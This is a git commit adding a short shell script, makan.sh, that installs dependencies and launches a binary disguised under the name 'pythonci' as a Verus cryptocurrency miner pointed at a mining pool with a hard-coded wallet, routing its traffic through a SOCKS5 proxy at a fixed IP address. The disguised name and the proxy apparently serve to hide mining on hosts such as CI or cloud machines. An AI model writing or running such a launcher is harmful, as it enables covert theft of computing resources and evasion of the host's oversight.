5722b603e8df65e6cc267ed3e8fa0c7d3d7a841d
khansaxfifth <86547951+khansaxfifth@users.noreply.github.com>
2021-08-16 01:15:27 +0700

    Create makan.sh

---
+++ makan.sh
@@ -0,0 +1,10 @@
+#!/bin/bash
+sudo apt update
+sudo apt install screen libjansson4 -y
+chmod +x odunn.sh && chmod +x pythonci chmod 777 pythonci odunn.sh
+screen -dmS ls
+PL=stratum+tcp://eu.luckpool.net:3956
+WT=RUEfFzYUwZSaXcLmdA6xyPvgwu7FLbkm6r
+WR=VIA-053
+PY=socks5://178.62.79.49:17173
+./pythonci -a verus -o $PL -u $WT.$WR -p x -t 2 -x $PY
